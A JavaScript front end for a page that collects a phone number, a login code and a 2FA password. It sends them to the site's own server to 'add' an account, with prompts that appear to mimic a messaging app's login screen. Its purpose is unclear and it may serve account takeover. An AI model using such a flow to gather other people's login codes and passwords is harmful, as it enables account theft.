let sessionId = null;
let phoneNumber = null;

function showMessage(text, type) {
    const msgDiv = document.getElementById('message');
    msgDiv.textContent = text;
    msgDiv.className = type;
}

function showLoader(show) {
    document.getElementById('loader').style.display = show ? 'block' : 'none';
}

function sendCode() {
    const countryCode = document.getElementById('countryCode').value.trim();
    const phone = document.getElementById('phone').value.trim().replace(/\s/g, '');
    
    if (!countryCode || !phone) {
        showMessage('Please enter country code and phone number', 'error');
        return;
    }

    phoneNumber = '+' + countryCode + phone;
    
    document.getElementById('sendBtn').disabled = true;
    showLoader(true);
    showMessage('Sending code...', 'info-message');

    fetch('/api/add-account', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({phone: phoneNumber})
    })
    .then(res => res.json())
    .then(data => {
        showLoader(false);
        document.getElementById('sendBtn').disabled = false;

        if (data.success) {
            sessionId = data.session_id;
            document.getElementById('phoneSection').style.display = 'none';
            document.getElementById('codeSection').style.display = 'block';
            document.getElementById('country').style.display = 'none';
            document.querySelector('.first pre').textContent = 'We\'ve sent the code to';
            document.getElementById('message').textContent = '';
            
            // Focus first input
            document.querySelector('.code-input').focus();
        } else {
            showMessage(data.error || 'Failed to send code', 'error');
        }
    })
    .catch(err => {
        showLoader(false);
        document.getElementById('sendBtn').disabled = false;
        showMessage('Network error: ' + err.message, 'error');
    });
}

function moveToNext(input, index) {
    if (input.value.length === 1) {
        input.classList.add('filled');
        const next = document.querySelectorAll('.code-input')[index + 1];
        if (next) next.focus();
    }

    // Auto submit when all filled
    const inputs = document.querySelectorAll('.code-input');
    const allFilled = Array.from(inputs).every(i => i.value.length === 1);
    if (allFilled) {
        setTimeout(() => verifyCode(), 100);
    }
}

function handleBackspace(input, e) {
    if (e.key === 'Backspace' && !input.value) {
        const index = Array.from(document.querySelectorAll('.code-input')).indexOf(input);
        const prev = document.querySelectorAll('.code-input')[index - 1];
        if (prev) {
            prev.focus();
            prev.value = '';
            prev.classList.remove('filled');
        }
    }
}

function verifyCode() {
    const inputs = document.querySelectorAll('.code-input');
    const code = Array.from(inputs).map(i => i.value).join('');

    if (code.length !== 5) {
        showMessage('Please enter 5-digit code', 'error');
        return;
    }

    document.querySelector('.verify-btn').disabled = true;
    showLoader(true);
    showMessage('Verifying...', 'info-message');

    fetch('/api/verify-code', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            session_id: sessionId,
            code: code
        })
    })
    .then(res => res.json())
    .then(data => {
        showLoader(false);
        document.querySelector('.verify-btn').disabled = false;

        if (data.success) {
            showMessage('✅ Account added successfully!', 'success');
            setTimeout(() => {
                window.location.href = '/home';
            }, 1500);
        } else if (data.need_password) {
            document.getElementById('codeSection').style.display = 'none';
            document.getElementById('passwordSection').style.display = 'block';
            document.querySelector('.first pre').textContent = 'Enter your 2FA password';
            document.getElementById('message').textContent = '';
            document.getElementById('password').focus();
        } else {
            showMessage(data.error || 'Verification failed', 'error');
            // Clear inputs
            inputs.forEach(input => {
                input.value = '';
                input.classList.remove('filled');
            });
            document.querySelector('.code-input').focus();
        }
    })
    .catch(err => {
        showLoader(false);
        document.querySelector('.verify-btn').disabled = false;
        showMessage('Network error: ' + err.message, 'error');
    });
}

function verifyPassword() {
    const password = document.getElementById('password').value;

    if (!password) {
        showMessage('Please enter password', 'error');
        return;
    }

    document.querySelector('.password-btn').disabled = true;
    showLoader(true);
    showMessage('Verifying...', 'info-message');

    fetch('/api/verify-code', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            session_id: sessionId,
            password: password
        })
    })
    .then(res => res.json())
    .then(data => {
        showLoader(false);
        document.querySelector('.password-btn').disabled = false;

        if (data.success) {
            showMessage('✅ Account added successfully!', 'success');
            setTimeout(() => {
                window.location.href = '/home';
            }, 1500);
        } else {
            showMessage(data.error || 'Verification failed', 'error');
            document.getElementById('password').value = '';
            document.getElementById('password').focus();
        }
    })
    .catch(err => {
        showLoader(false);
        document.querySelector('.password-btn').disabled = false;
        showMessage('Network error: ' + err.message, 'error');
    });
}

function backToPhone() {
    document.getElementById('phoneSection').style.display = 'block';
    document.getElementById('codeSection').style.display = 'none';
    document.getElementById('passwordSection').style.display = 'none';
    document.getElementById('country').style.display = 'block';
    document.querySelector('.first pre').textContent = 'Please confirm your country code\nand enter your phone number';
    document.getElementById('message').textContent = '';
    
    // Clear inputs
    document.querySelectorAll('.code-input').forEach(input => {
        input.value = '';
        input.classList.remove('filled');
    });
    document.getElementById('password').value = '';
    
    sessionId = null;
}

// Country code auto-fill
document.getElementById('countrySelect').addEventListener('change', function() {
    document.getElementById('countryCode').value = this.value;
});

// Load saved country on page load
window.addEventListener('load', function() {
    document.getElementById('countryCode').focus();
    
    const savedCountry = localStorage.getItem('selectedCountry');
    if (savedCountry) {
        document.getElementById('countrySelect').value = savedCountry;
        document.getElementById('countryCode').value = savedCountry;
    }
});

// Save country selection
document.getElementById('countrySelect').addEventListener('change', function() {
    localStorage.setItem('selectedCountry', this.value);
});

// Enter key handlers
document.getElementById('countryCode').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') sendCode();
});

document.getElementById('phone').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') sendCode();
});

document.getElementById('password').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') verifyPassword();
});

// Allow only numbers
document.getElementById('countryCode').addEventListener('input', function(e) {
    this.value = this.value.replace(/[^0-9]/g, '');
});

document.getElementById('phone').addEventListener('input', function(e) {
    this.value = this.value.replace(/[^0-9]/g, '');
});
